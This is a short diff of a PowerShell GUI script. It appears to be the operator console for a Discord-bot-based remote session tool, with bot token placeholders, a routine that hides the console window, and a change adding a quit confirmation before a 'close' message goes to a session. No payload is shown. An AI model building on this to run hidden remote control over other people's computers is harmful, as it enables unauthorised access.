@@ -5,7 +5,6 @@ Add-Type -AssemblyName System.Drawing
 # Variables for token and channel IDs
 $token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
 $token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER
-
 $hidewindow = 1
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -327,13 +326,16 @@ sendMsg -Message $msgtosend -id $PSID
 
 $button2.Add_Click({
 
-$msgtosend = $TextBoxInput.Text
-sendMsg -Message 'close' -id $ID3
-sleep 3
-$form.Close()
-sleep 1
-exit
-
+    $msgtosend = $TextBoxInput.Text
+    $sure = (New-Object -ComObject Wscript.Shell).Popup("Are you Sure you want to quit?",0,"Close Session",0x1)
+    if ($sure -eq 1){
+        Add-OutputBoxLine -Outfeed "CLOSING SESSION"
+        sendMsg -Message 'close' -id $ID3
+        sleep 3
+        $form.Close()
+        sleep 1
+        exit
+    }
 })
 
 $timer.Start()
